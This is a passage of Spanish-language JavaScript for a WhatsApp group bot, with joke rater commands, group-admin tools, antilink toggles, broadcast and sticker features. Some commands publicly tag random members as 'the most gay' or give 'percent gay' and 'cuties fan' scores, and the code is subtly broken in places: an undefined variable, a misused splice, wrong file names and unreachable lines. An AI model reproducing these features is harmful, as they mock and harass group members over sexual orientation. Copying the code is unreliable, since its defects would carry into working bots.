if (gay < 20 ) {ga = 'Usted es hetero 🤪🤙'} else if (gay == 21 ) {ga = 'Mas o menos 🤔'} else if (gay == 23 ) {ga = 'Mas o menos 🤔'} else if (gay == 24 ) {ga = 'Mas o menos 🤔'} else if (gay == 25 ) {ga = 'Mas o menos 🤔'} else if (gay == 26 ) {ga = 'Mas o menos 🤔'} else if (gay == 27 ) {ga = 'Mas o menos 🤔'} else if (gay == 28 ) {ga = 'Mas o menos 🤔'} else if (gay == 29 ) {ga = 'Mas o menos 🤔'} else if (gay == 30 ) {ga = 'Mas o menos 🤔'} else if (gay == 31 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 32 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 33 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 34 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 35 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 36 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 37 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 38 ) {ga = 'TTengo mi dudas 😑'} else if (gay == 39 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 40 ) {ga = 'Tengo mi dudas 😑'} else if (gay == 41 ) {ga = 'Tengo razon? 😏'} else if (gay == 42 ) {ga = 'Tengo razon? 😏'} else if (gay == 43 ) {ga = 'Tengo razon? 😏'} else if (gay == 44 ) {ga = 'Tengo razon? 😏'} else if (gay == 45 ) {ga = 'Tengo razon? 😏'} else if (gay == 46 ) {ga = 'Tengo razon? 😏'} else if (gay == 47 ) {ga = 'Tengo razon? 😏'} else if (gay == 48 ) {ga = 'Tengo razon? 😏'} else if (gay == 49 ) {ga = 'Tengo razon? 😏'} else if (gay == 50 ) {ga = 'Eres o no? 🧐'} else if (gay > 51) {ga = 'Usted es gay 🥸'}
hasil = `${rate}Usted es ${random}% gay\n\n${ga}`
reply(hasil)
break

case 'cuties':
if (!isUser) return reply(mess.only.daftarB)
rate = body.slice(8)
client.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
cuties = random
if (cuties < 20 ) {cu = 'Mi loco usted va para el cielo 👏'} else if (cuties == 21 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 23 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 24 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 25 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 26 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 27 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 28 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 29 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 30 ) {cu = 'Te salvaste ramirez 😎'} else if (cuties == 31 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 32 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 33 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 34 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 35 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 36 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 37 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 38 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 39 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 40 ) {cu = 'Ramirez que hace viendo cuties 🤔'} else if (cuties == 41 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 42 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 43 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 44 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 45 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 46 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 47 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 48 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 49 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties == 50 ) {cu = 'Mmm sospechoso ramirez 🧐'} else if (cuties > 51) {cu = 'Señores un autentico FAN DE CUTIES esta en el grupo 🥸'}
hasil = `${rate}Usted es ${random}% fan de cuties\n\n${cu}`
reply(hasil)
break

					/*
case 'racista':
if (!isUser) return reply(mess.only.daftarB)
rate = body.slice(9)
client.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
racista = random
if (racista < 20 ) {ra = 'Tu no eres racista 👏'} else if (racista == 21 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 23 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 24 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 25 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 26 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 27 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 28 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 29 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 30 ) {ra = 'Mmm tengos mi dudas 🧐'} else if (racista == 31 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 32 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 33 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 34 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 35 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 36 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 37 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 38 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 39 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 40 ) {ra = 'Eres racista en secreto 🙀'} else if (racista == 41 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 42 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 43 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 44 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 45 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 46 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 47 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 48 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 49 ) {ra = 'Fuck men alto racista 😡'} else if (racista == 50 ) {ra = 'Fuck men alto racista 😡'} else if (racista > 51) {ra = 'UN AUTENTICO RACISTA 🥸'}
hasil = `${rate}Usted es ${random}% racista\n\n${ra}`
reply(hasil)
break
					*/
				  
case 'rankgay':
try{
if (!isUser) return reply(mess.only.daftarB)
if (!isGroup) return reply(mess.only.group)
d = []
teks = 'Top 5 de los mas gays del grupo\n\n'
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `➔ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Hubo un error intentalo nuevamente :/')
}
break
					
case 'topcabros':
case 'topkabros':
try{
if (!isUser) return reply(mess.only.daftarB)
if (!isGroup) return reply(mess.only.group)
d = []
teks = 'Top 10 de los mas gays del grupo\n\n'
for(i = 0; i < 10; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `➔ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true)
} catch (e) {
console.log(e)
reply('Hubo un error intentalo nuevamente :/')
}
break
											
/******JUEGOS SHANDUY LA PUTA MADRE NO TE OLVIDES******/					
					
					
       				case 'wa.me':
				  case 'wame':
  client.updatePresence(from, Presence.composing) 
      options = {
          text: `「 *LINK WHATSAPP* 」\n\n_Solicitado por_ : @${sender.split("@s.whatsapp.net")[0]}\n\nSu link de Whatsapp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n*O ( / )*\n*https://api.whatsapp.com/send?phone=${sender.split("@")[0]}*`,
          contextInfo: { mentionedJid: [sender] }
    }
    client.sendMessage(from, options, text, { quoted: mek } )
				break
				if (data.error) return reply(data.error)
				reply(data.result)
				break
		
	
	case 'creador':
	case 'owner':
	       client.sendMessage(from, {displayname: "ᝰJσʂҽρԋ᭄", vcard: vcard}, MessageType.contact, { quoted: mek})
		client.sendMessage(from, 'Alguna duda o queja, ahi tienes el número del creador',MessageType.text, { quoted: mek} )
                const none = fs.readFileSync('./mp3/creador/roleo.mp3');
		client.sendMessage(from, none, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
                break
	
	
	case 'x':
	case 'hidetag':
                client.updatePresence(from, Presence.composing) 
                if (!isGroupAdmins) return reply(mess.only.Badmin)
		if (!isUser) return reply(mess.only.daftarB)
                if (!isGroup) return reply(mess.only.group)
                teks = body.slice(3)
                group = await client.groupMetadata(from);
                member = group['participants']
                jids = [];
                member.map( async adm => {
                jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
                 })
                 options = {
                 text: teks,
                contextInfo: {mentionedJid: jids},
                quoted: mek
                }
              await client.sendMessage(from, options, text)
               break
                               case 'tts':
				   client.updatePresence(from, Presence.recording) 
				   if (args.length < 1) return client.sendMessage(from, 'Cual es el código de idioma?\n\nPara saber el codigo de idioma coloque el comando ${prefix}idioma', text, {quoted: mek})
                                   if (!isUser) return reply(mess.only.daftarB)
					const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return client.sendMessage(from, 'Y el texto?', text, {quoted: mek})
					dtt = body.slice(8)
					ranm = getRandom('.mp3')
					rano = getRandom('.ogg')
					dtt.length > 600
					? reply('Texto muy largo weon')
					: gtts.save(ranm, dtt, function() {
						exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
							fs.unlinkSync(ranm)
							buff = fs.readFileSync(rano)
							if (err) return reply('Gagal om:(')
							client.sendMessage(from, buff, audio, {quoted: mek, ptt:true})
							fs.unlinkSync(rano)
						})
					})
					break
                                case 'listadmins':
				case 'adminlist':
				case 'staff':
					client.updatePresence(from, Presence.composing) 
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroup) return reply(mess.only.group)
					teks = `*Lista De Administradores Del Grupo*\n\n${groupMetadata.subject}\n\nTotal: ${groupAdmins.length}\n\n`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
					}
					mentions(teks, groupAdmins, true)
					break
			case 'setprefix':
					client.updatePresence(from, Presence.composing) 
					if (args.length < 1) return
					if (!isOwner) return reply(mess.only.ownerB)
					prefix = args[0]
					reply(`El prefijo se ha cambiado correctamente a : ${prefix}`)
					break
			case 'tagall':
			case 'todos':
				client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(7).trim() : ''
					teks += `  Total : ${groupMembers.length}\n`
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(' ╭❏ MENCIONANDO\n │⊷ '+teks+' ╰❏ ⌜ JOSEPH 🇧🇪⌟', members_id, true)
					break
			case 'firmes':
				client.updatePresence(from, Presence.composing) 
					if (!isGroup) return reply(mess.only.group)
                                        if (!isUser) return reply(mess.only.daftarB)
					if (!isGroupAdmins) return reply(mess.only.admin)
					members_id = []
					teks = (args.length > 1) ? body.slice(7).trim() : ''
					teks += `  Total : ${groupMembers.length}\n`
					for (let mem of groupMembers) {
						teks += `╠➥ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions('╔══✪〘 MENCIONANDO 〙✪══\n╠➥'+teks+'╚═〘 BY JOSEPH-BOT 〙', members_id, true)
					break
                                case 'send':
					var pc = body.slice(6)
					var nomor = pc.split("|")[0];
					var pesan = pc.split("|")[1];
					client.sendMessage(nomor+'@s.whatsapp.net', pesan, text)
					break
				case 'setppbot':
				client.updatePresence(from, Presence.composing) 
				if (!isQuotedImage) return reply(`Sube fotos con subtítulos ${prefix}Ok`)
					if (!isOwner) return reply(mess.only.ownerB)
					enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await client.downloadAndSaveMediaMessage(enmedia)
					await client.updateProfilePicture(botNumber, media)
					reply('Gracias por el nuevo perfil')
					break
				case 'bc':
					client.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('.......')
					anu = await client.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 TRANSMISIÓN 」*\n\n${body.slice(4)}`})
						}
						reply('')
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `*「 _*by shanduy*_ 」*\n\n${body.slice(4)}`)
						}
						reply('Transmisión exitosa')
					}
					break
					case 'bcgc':
					client.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('.......')
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						buff = await client.downloadMediaMessage(encmedia)
						for (let _ of groupMembers) {
							client.sendMessage(_.jid, buff, image, {caption: `*「 GRUPO BC 」*\n*Grupo* : ${groupName}\n\n${body.slice(6)}`})
						}
						reply('')
					} else {
						for (let _ of groupMembers) {
							sendMess(_.jid, `*「 BC GROUP 」*\n*Group* : ${groupName}\n\n${body.slice(6)}`)
						}
						reply('Grupo de transmisión exitoso')
					}
					
                     
				
		
                                       
				
			//ANTILINKS DE REDES SOCIALES
				
				case 'antiwa':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiWa) return reply('El antilink de Whatsapp ya esta activo')
						antiwa.push(from)
						fs.writeFileSync('./src/antidiscord.json', JSON.stringify(antiwa))
						reply('❬ ✅ ❭ La funcion de antilink de Whatsapp esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envie un link de *Discord* a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antiwa.splice(from)
						fs.writeFileSync('./src/antidiscord.json', JSON.stringify(antiwa))
						reply('❬ ✅ ❭ La funcion de antilink de Whatsapp esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
					
				case 'antidiscord':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiDiscord) return reply('El antilink de Instagram ya esta activo')
						antidiscord.push(from)
						fs.writeFileSync('./src/antidiscord.json', JSON.stringify(antidiscord))
						reply('❬ ✅ ❭ La funcion de antilink de Discord esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envie un link de *Discord* a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antidiscord.splice(from)
						fs.writeFileSync('./src/antidiscord.json', JSON.stringify(antidiscord))
						reply('❬ ✅ ❭ La funcion de antilink de Discord esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
				
				case 'antikwai':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiKwai) return reply('El antilink de Instagram ya esta activo')
						antikwai.push(from)
						fs.writeFileSync('./src/antinsta.json', JSON.stringify(antikwai))
						reply('❬ ✅ ❭ La funcion de antilink de Kwai esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envie un link de *Kwai* o de su perfil para pedir likes o followers a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antikwai.splice(from)
						fs.writeFileSync('./src/antinsta.json', JSON.stringify(antikwai))
						reply('❬ ✅ ❭ La funcion de antilink de Kwai esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
				
				case 'antinsta':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntInsta) return reply('El antilink de Instagram ya esta activo')
						antinsta.push(from)
						fs.writeFileSync('./src/antinsta.json', JSON.stringify(antinsta))
						reply('❬ ✅ ❭ La funcion de antilink de Instagram esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envie un link de *Instagram* o de su perfil para pedir likes o followers a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antinsta.splice(from)
						fs.writeFileSync('./src/antinsta.json', JSON.stringify(antinsta))
						reply('❬ ✅ ❭ La funcion de antilink de Instagram esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
				
				
                                  case 'antitik':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiTik) return reply('El antilink de Tik Tok ya esta activo')
						antitik.push(from)
						fs.writeFileSync('./src/antitik.json', JSON.stringify(antitik))
						reply('❬ ✅ ❭ La funcion de antilink de Tik Tok esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envia un link de *Tik Tok* o de su perfil a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antitik.splice(from)
						fs.writeFileSync('./src/antitik.json', JSON.stringify(antitik))
						reply('❬ ✅ ❭ La funcion de antilink de Tik Tok esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
				
				
				case 'antiface':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiFace) return reply('El antilink de facebook ya esta activo')
						antiface.push(from)
						fs.writeFileSync('./src/antiface.json', JSON.stringify(antiface))
						reply('❬ ✅ ❭ La funcion de antilink de Facebook esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nDesde ahora cualquier participante que envia un link de *Facebook* o de alguna publicacion para pedir likes o grupos a este grupo sera expulsado de inmediato\n\n_*Razones: Spam*_`, text)
					} else if (Number(args[0]) === 0) {
						antiface.splice(from)
						fs.writeFileSync('./src/antiface.json', JSON.stringify(antiface))
						reply('❬ ✅ ❭ La funcion de antilink de Facebook esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
				        
			       case 'antilink':
                                        if (!isGroup) return reply(mess.only.group)
					if (!isUser) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroupAdmins) return reply(mess.only.ownerG)
					if (args.length < 1) return reply('Escriba correctamente el comando')
					if (Number(args[0]) === 1) {
						if (isAntiLink) return reply('El antilink ya esta activo')
						antilink.push(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ La funcion de antilink de Grupos De Whatsapp esta habilitada en este grupo')
						client.sendMessage(from,`Atención a todos los miembros activos de este grupo 📣\n\nEl antilink esta activo\n\nY solo los admins de este grupo podran pasar el enlace\n\nSi algun participante que no se admin envía un enlace de este grupo u otro grupo sera expulsado de este grupo de inmediato`, text)
					} else if (Number(args[0]) === 0) {
						antilink.splice(from)
						fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
						reply('❬ ✅ ❭ La funcion de antilink de Grupos De Whatsapp esta deshabilitada en este grupo')
					} else {
						reply('Escriba correctamente el comando')
					}
					break
			        
				
				//FIN DE ANTILINK HECHO POR SHANDUY
				
//ADMINISTRACION DE GRUPOS
		                
case 'exe':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
setTimeout( () => {
client.groupLeave (from) 
}, 2000)
setTimeout( () => {
client.updatePresence(from, Presence.composing) 
client.sendMessage(from, 'NO VEMO GILE ✋🥸🤚', text) // ur cods
}, 0)
break
       
case 'grupocr':
client.updatePresence(from, Presence.composing) 
options = {
text: `El creador de este grupo es: @${from.split("-")[0]}`, 
contextInfo: { mentionedJid: [from] }
}
client.sendMessage(from, options, text, { quoted: mek } )
break
                                      
case 'kick':
case 'pafuera':
case 'bye':
case 'amaterasu':
case 'sharingan':
case 'kawai':
case 'kawaii':
case 'byakugan':
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroup) return reply(mess.only.group)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return reply('Marca al que vamos a funar')
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
client.groupRemove(from, mems_ids)
} else {
client.groupRemove(from, [entah[0]])
}
} else {
entah = ridwan.message.extendedTextMessage.contextInfo.participant
client.groupRemove(from, [entah])
}
break

case 'demote':
case 'quitar':
case 'f':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Etiqueta a la persona que voy a quitar el admin')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = ''
for (let _ of mentioned) {
teks += `Pedido recibido✅\n\nRetirando cargo como administrador :\n`
teks += `@_.split('@')[0]`
}
mentions(teks, mentioned, true)
client.groupDemoteAdmin(from, mentioned)
} else {
mentions(`Pedido recibido✅\n\nRetirando cargo como administrador @${mentioned[0].split('@')[0]}\n*${groupMetadata.subject}*_`, mentioned, true)
client.groupDemoteAdmin(from, mentioned)
}
break

case 'promote':
case 'dar':
client.updatePresence(from, Presence.composing) 
if (!isUser) return reply(mess.only.daftarB)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('A quien voy a dar admin??\n\n*Ejemplo:* ${prefix}promote @xxxxxxx')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = 'Pedido recibido✅\n\nAgregando cargo como administrador :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
client.groupMakeAdmin(from, mentioned)
} else {
mentions(`Pedido recibido✅\n\nAgregando cargo como administrador : @${mentioned[0].split('@')[0]}`, mentioned, true)
client.groupMakeAdmin(from, mentioned)
}
break				
				
case 'linkgc':
client.updatePresence(from, Presence.composing) 
if (!isGroup) return reply(mess.only.group)
if (!isUser) return reply(mess.only.daftarB)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
linkgc = await client.groupInviteCode (from)
yeh = `Aqui esta el link del grupo\n\nhttps://chat.whatsapp.com/${linkgc}\n\nLink Del Grupo *${groupName}*`
client.sendMessage(from, yeh, text, {quoted: mek, detectLinks: false})
break

case 'closegc':
client.updatePresence(from, Presence.composing) 
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
var nomor = mek.participant
const close = {
text: `Grupo cerrado por el administrador @${nomor.split("@s.whatsapp.net")[0]}\nAhora *solo los administradores* puede enviar mensajes`,
contextInfo: { mentionedJid: [nomor] }
}
client.groupSettingChange (from, GroupSettingChange.messageSend, true);
reply(close)
break
                
case 'opengc':                
client.updatePresence(from, Presence.composing) 
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
open = {
text: `Grupo abierto por el administrador @${sender.split("@")[0]}\nAhora *todos los participantes* pueden enviar mensajes`,
contextInfo: { mentionedJid: [sender] }
}
client.groupSettingChange (from, GroupSettingChange.messageSend, false)
client.sendMessage(from, open, text, {quoted: mek})
break
				                
case 'unir':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Para de emocion ✋\nPara unir a una persona debes escribir el numero sin (+)\n\nEjemplo: /unir 52xxxxxxxxx')
if (args[0].startsWith('+')) return reply(mess.error.unire)
try {0
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
client.groupAdd(from, [num])
} catch (e) {
console.log('Error:', e)
reply('No se pudo agregar el destino, tal vez porque es privado')
}
break
				
case 'fgc': 
reply(mess.foto)
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
media = await client.downloadAndSaveMediaMessage(mek)
await client.updateProfilePicture (from, media)
reply('*⌊✅⌉ El cambio de foto del grupo fue exitoso*')
break						
				
case 'ngc':
      if (!isGroup) return reply(mess.only.group)
      if (!isGroupAdmins) return reply(mess.only.admin)
      if (!isBotGroupAdmins) return reply(mess.only.Badmin)
      client.groupUpdateSubject(from, `${body.slice(5)}`)
      client.sendMessage(from, '*⌊✅⌉ El nombre del grupo fue cambiado*', text, {quoted: mek})
      break

case 'dgc':
      if (!isGroup) return reply(mess.only.group)
      if (!isGroupAdmins) return reply(mess.only.admin)
      if (!isBotGroupAdmins) return reply(mess.only.Badmin)
      client.groupUpdateDescription(from, `${body.slice(5)}`)
      client.sendMessage(from, '*⌊✅⌉ La descripción del grupo fue cambiado*', text, {quoted: mek})
      break

case 'welcome':
if (!isGroup) return reply(mess.only.group)
if (!isUser) return reply(mess.only.daftarB)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isGroupAdmins) return reply(mess.only.Badmin)
if (args.length < 1) return reply('Para activar está funcion coloca *welcome 1')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('Ya esta activada!!!')
welkom.push(from)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
reply('❬ ✅ ❭ La funcion de bienvenida esta habilitada en este grupo')
} else if (Number(args[0]) === 0) {
welkom.splice(from)
fs.writeFileSync('./database/json/welkom.json', JSON.stringify(welkom))
reply('❬ ✅ ❭ La funcion de bienvenida esta deshabilitada en este grupo')
} else {
reply('Escribe el comando 1 para activarlo y 0 para desactivarlo Ejemplo: /welcome 1')
}
break					
					
					
//FIN DE ADMINISTRACION DE GRUPOS				
				
				
				
//CREACION DE STICKERS Y VARIOS				
				
				case 's':
                                case 'stiker':
				case 'sticker':
				case 'stickergif':
				case 'stikergif':
				if (!isUser) return reply(mess.only.daftarB)
                               if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await client.downloadAndSaveMediaMessage(encmedia)
                                                ran = getRandom('.webp')
						await ffmpeg(`./${media}`)
							.input(media)
							.on('start', function (cmd) {
								console.log(`Started : ${cmd}`)
							})
							.on('error', function (err) {
								console.log(`Error : ${err}`)
								fs.unlinkSync(media)
								reply(mess.error.stick)
							})
							.on('end', function () {
								console.log('Finish')
								exec(`webpmux -set exif ${addMetadata(pack, author)} ${ran} -o ${ran}`, async (error) => {
									 if (error) {    
										         fs.unlinkSync(media)	
											 fs.unlinkSync(ran)
											 }
									client.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
									fs.unlinkSync(media)	
									fs.unlinkSync(ran)	
								})
							})
							.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
							.toFormat('webp')
